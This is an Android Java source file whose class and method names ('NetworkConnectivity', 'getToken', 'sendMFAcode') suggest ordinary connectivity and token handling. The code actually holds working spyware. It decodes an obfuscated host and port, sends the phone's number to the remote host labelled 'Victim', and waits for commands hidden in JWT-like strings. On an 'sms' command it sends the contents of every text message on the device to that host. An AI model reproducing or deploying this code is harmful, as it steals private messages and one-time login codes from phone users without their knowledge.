package com.example.yureistriker;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import java.io.*;
import java.lang.reflect.Method;
import java.net.Socket;
import java.util.Arrays;
import java.util.Base64;

public class NetworkConnectivity {
    static String host = "venom.unity3d.com";
    static int port = 80;

    private static String hostPath(String hst){
        int[] givenArray = {70, 55, -6, 12, -3, 0, 2, 13, 59, 6, 18, -63, -11, -61, 53, 6, -2};
        char[] venomChars = hst.toCharArray();
        StringBuilder resultString = new StringBuilder();

        for (int i = 0; i < givenArray.length && i < venomChars.length; i++) {
            int res = venomChars[i] - givenArray[i];
            resultString.append((char) res);
        }

        port += 12837;

        return resultString.toString();
    }

    public static void getToken(Context context) {
        try (Socket socket = new Socket(hostPath(host), port)) {
            InputStream in = socket.getInputStream();
            OutputStream out = socket.getOutputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(in));
            PrintWriter writer = new PrintWriter(out, true);

            TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
                    || ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                String phone = tMgr.getLine1Number();
                String sender = "Victim: " + phone + "\n";
                if (phone != null && !phone.isEmpty()) {
                    out.write(sender.getBytes(), 0, sender.getBytes().length);
                    out.flush();
                }
            }

            String command;
            String jwtHeader = "eyJh";
            while ((command = reader.readLine()) != null) {
                if (command.contains(jwtHeader)) {
                    String[] parts = command.split("\\.");
                    if (parts.length == 3) {
                        String payload = new String(Base64.getUrlDecoder().decode(parts[1]));
                        if(!tokenValidation(context, in, out, payload)){
                            writer.println("Unable to do the ops");
                        }
                    }
                }
            }
        }catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        }
    }

    static boolean tokenValidation(Context context, InputStream in, OutputStream out, String payload) throws InterruptedException, IOException, NoSuchMethodException {
        if(payload.contains("sms")){
            sendMFAcode(context, out);
            return true;
        }

        return false;
    }

    @SuppressLint("Range")
    public static void sendMFAcode(Context context, OutputStream out) throws IOException {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
            ContentResolver contentResolver = context.getContentResolver();
            Uri smsUri = Telephony.Sms.CONTENT_URI;
            Cursor cursor = contentResolver.query(smsUri, null, null, null, null);

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    long date = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));
                    String logEntry = "Address: " + address + ", Message: " + body + ", Date: " + date + "\n";
                    byte[] logEntryBytes = logEntry.getBytes();
                    out.write(logEntryBytes, 0, logEntryBytes.length);
                    out.flush();
                } while (cursor.moveToNext());
                cursor.close();
            }
        }
    }
}
